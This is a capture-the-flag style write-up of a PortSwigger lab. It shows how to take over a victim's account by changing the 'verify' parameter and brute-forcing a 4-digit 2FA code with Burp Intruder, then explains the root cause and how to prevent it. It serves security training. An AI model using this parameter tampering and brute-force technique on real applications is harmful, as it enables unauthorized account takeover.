# 2FA Broken Logic

## Objective

Exploit flawed two-factor authentication logic to brute-force Carlos's 2FA verification code and access his account.

---

## Credentials

```text
Attacker Account:
wiener:peter

Victim Account:
carlos
```

---

## Tools Used

* Burp Suite Community Edition
* Burp Repeater
* Burp Intruder

---

## Step 1 - Login to Attacker Account

Login using the provided attacker credentials:

```text
Username: wiener
Password: peter
```

The application redirects to the 2FA verification page.

---

## Step 2 - Analyze 2FA Request

Intercept the 2FA verification request using Burp Suite.

The request looks similar to:

```http
POST /login2 HTTP/1.1

verify=wiener&mfa-code=1234
```

Notice that the application uses the `verify` parameter to determine which user's account is being verified.

---

## Step 3 - Logout

Logout from the attacker account.

---

## Step 4 - Generate Carlos's OTP Session

Send the following request to Burp Repeater:

```http
GET /login2?verify=wiener HTTP/1.1
```

Modify the parameter:

```http
verify=carlos
```

Send the request.

This generates a temporary 2FA session for Carlos.

---

## Step 5 - Login Again

Login again using the attacker credentials:

```text
Username: wiener
Password: peter
```

When prompted for the MFA code, enter any invalid code.

---

## Step 6 - Send Request to Intruder

Intercept the following request:

```http
POST /login2 HTTP/1.1

verify=wiener&mfa-code=0000
```

Send the request to Burp Intruder.

---

## Step 7 - Configure Intruder

Change the verify parameter:

```http
verify=carlos
```

Add payload position only to the MFA code:

```http
mfa-code=§0000§
```

---

## Step 8 - Select Payload Type

Choose:

```text
Payload Type: Sniper
```

---

## Step 9 - Configure Payloads

Go to:

```text
Payloads → Payload Type
```

Select:

```text
Numbers
```

Configure:

```text
From: 0000
To: 9999
Step: 1
Min integer digits: 4
```

Start the attack.

---

## Step 10 - Identify Successful Response

Most responses return:

```text
200 OK
```

One response returns:

```text
302 Found
```

This indicates a successful login.

---

## Step 11 - Access Victim Account

Open the successful response in browser.

Navigate to:

```text
/my-account
```

Carlos's account page loads successfully.

Lab solved.

---

## Vulnerability

The application fails to properly bind the second authentication step to the authenticated user session.

Instead, it trusts the user-controlled `verify` parameter to determine which account is being verified.

An attacker can manipulate this parameter and brute-force another user's MFA code without knowing their password.

---

## Root Cause

The server does not verify whether:

* The same user completed both authentication steps
* The MFA verification belongs to the authenticated session

The application relies on client-controlled input for authorization decisions.

---

## Prevention

* Bind MFA verification to the authenticated session server-side.
* Never trust user-controlled parameters for identity validation.
* Implement rate limiting on MFA attempts.
* Add account lockout protections after multiple failed OTP attempts.
* Use secure session tracking during multi-step authentication.

---

## Key Learning

Two-factor authentication becomes insecure when verification logic depends on user-controlled parameters instead of server-side session validation.

Even strong MFA mechanisms can fail because of broken authentication logic.

---

## Tags

`#PortSwigger` `#Authentication` `#2FA` `#BrokenLogic` `#BurpSuite` `#BruteForce`
